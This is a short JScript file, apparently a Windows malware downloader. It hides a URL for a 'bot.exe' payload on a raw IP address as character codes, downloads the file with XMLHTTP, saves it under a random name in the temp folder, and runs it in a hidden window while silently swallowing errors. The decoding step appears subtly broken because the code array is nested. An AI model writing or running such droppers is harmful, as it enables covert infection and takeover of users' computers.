var d1ph3=1;var s=[[104,116,116,112,58,47,47,53,50,46,53,57,46,50,51,53,46,52,57,58,56,48,56,48,47,112,97,121,108,111,97,100,47,100,51,97,52,56,99,102,57,56,52,98,50,47,98,111,116,46,101,120,101]];var u='';for(var i=0;i<s.length;i++)u+=String.fromCharCode(s[i]);
try{var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET',u,false);x.send();
if(x.status==200){var st=new ActiveXObject('ADODB.Stream');st.Type=1;st.Open();st.Write(x.responseBody);
var p=WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%TEMP%')+'\\'+Math.random().toString(36).substring(2,9)+'.exe';
st.SaveToFile(p,2);st.Close();WScript.CreateObject('WScript.Shell').Run('"'+p+'"',0,false);}}catch(e){}
